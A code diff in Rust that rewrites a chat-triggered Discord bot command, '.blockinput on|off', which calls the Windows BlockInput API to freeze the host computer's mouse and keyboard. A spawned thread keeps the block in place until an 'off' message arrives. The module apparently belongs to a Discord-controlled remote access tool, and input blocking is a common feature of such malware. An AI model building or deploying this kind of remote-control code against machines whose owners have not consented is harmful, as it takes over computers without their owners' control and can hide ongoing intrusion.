@@ -1,70 +1,69 @@
-use crate::commands::*;
-use anyhow::Result;
-use async_trait::async_trait;
-use std::sync::Arc;
-use twilight_http::Client as HttpClient;
-use twilight_model::channel::message::Message;
+use crate::prelude::*;
+use windows::Win32::UI::Input::KeyboardAndMouse::BlockInput;
+use std::sync::Mutex;
+use std::sync::mpsc::{self, Sender};
+use once_cell::sync::Lazy;
 
-use winapi::um::winuser::BlockInput;
+static BLOCK_CONTROLLER: Lazy<Mutex<Option<Sender<()>>>> = Lazy::new(|| Mutex::new(None));
 
-pub struct BlockInputCommand;
+#[poise::command(prefix_command)]
+pub async fn blockinput(
+    ctx: PoiseContext<'_>,
+    #[description = "on/off"]
+    #[rest]
+    state: Option<String>,
+) -> Result<(), Error> {
+    let state = match state {
+        Some(s) => s.to_lowercase(),
+        None => {
+            ctx.say("Usage: `.blockinput <on|off>`").await?;
+            return Ok(());
+        }
+    };
 
-#[async_trait]
-impl BotCommand for BlockInputCommand {
-    fn name(&self) -> &str { "blockinput" }
-    fn description(&self) -> &str { "Block or unblock mouse and keyboard input" }
-    fn category(&self) -> &str { "system" }
-    fn usage(&self) -> &str { ".blockinput <on|off>" }
-    fn examples(&self) -> &'static [&'static str] {
-        &[
-            ".blockinput on",
-            ".blockinput off",
-        ]
-    }
-    fn aliases(&self) -> &'static [&'static str] { &["block"] }
+    match state.as_str() {
+        "on" | "true" | "1" => {
+            let (tx, rx) = mpsc::channel();
+            
+            let installed = {
+                let mut guard = BLOCK_CONTROLLER.lock().unwrap();
+                if guard.is_some() {
+                    false
+                } else {
+                    *guard = Some(tx);
+                    true
+                }
+            };
 
-    async fn execute(
-        &self,
-        http: &Arc<HttpClient>,
-        msg: &Message,
-        mut args: Arguments,
-    ) -> Result<()> {
-        let action = match args.next() {
-            Some(a) => a.to_lowercase(),
-            None => {
-                http.create_message(msg.channel_id)
-                    .content("**Usage**: `.blockinput <on|off>`")
-                    .await?;
+            if !installed {
+                ctx.say("Input is already blocked.").await?;
                 return Ok(());
             }
-        };
 
-        let enable = match action.as_str() {
-            "on" | "enable" | "block" => true,
-            "off" | "disable" | "unblock" => false,
-            _ => {
-                http.create_message(msg.channel_id)
-                    .content("**Error**: Action must be `on` or `off`")
-                    .await?;
-                return Ok(());
-            }
-        };
+            std::thread::spawn(move || {
+                unsafe {
+                   let _ = BlockInput(true);
+                   let _ = rx.recv();
+                   let _ = BlockInput(false);
+                }
+            });
 
-        unsafe {
-            let result = BlockInput(if enable { 1 } else { 0 });
+            ctx.say("Input blocked.").await?;
+        }
+        "off" | "false" | "0" => {
+            let tx_opt = { BLOCK_CONTROLLER.lock().unwrap().take() };
 
-            if result != 0 {
-                let status = if enable { "blocked" } else { "unblocked" };
-                http.create_message(msg.channel_id)
-                    .content(&format!("Successfully {} mouse and keyboard input", status))
-                    .await?;
+            if let Some(tx) = tx_opt {
+                let _ = tx.send(());
+                ctx.say("Input unblocked.").await?;
             } else {
-                http.create_message(msg.channel_id)
-                    .content("Failed to change input blocking state. This command requires administrator privileges.")
-                    .await?;
+                ctx.say("Input was not blocked (or blocked by another process).").await?;
             }
         }
-
-        Ok(())
+        _ => {
+            ctx.say("Usage: `.blockinput <on|off>`").await?;
+        }
     }
+
+    Ok(())
 }
